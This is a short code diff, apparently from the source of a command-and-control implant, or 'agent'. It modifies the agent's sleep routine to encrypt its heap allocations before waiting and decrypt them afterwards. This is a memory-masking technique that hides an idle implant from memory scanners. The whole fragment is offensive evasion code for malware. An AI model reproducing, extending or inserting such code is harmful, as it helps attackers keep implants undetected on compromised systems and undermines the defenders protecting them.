@@ -215,5 +215,20 @@ _KH_END:
 auto DECLFN Mask::Wait(
     _In_ ULONG Time
 ) -> BOOL {
-    return Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), Time );
+    if ( Self->Hp->Obfuscate ) {
+        KhDbg( "Obfuscating heap allocations from agent" );
+        Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), 500 );
+        Self->Hp->Crypt();
+    }
+
+    KhDbg( "Sleep..." );
+
+    Self->Krnl32.WaitForSingleObject( NtCurrentProcess(), Time );
+
+    if ( Self->Hp->Obfuscate ) {
+        KhDbg( "Deobfuscating heap allocations from agent" );
+        Self->Hp->Crypt();
+    }
+
+    return TRUE;
 }
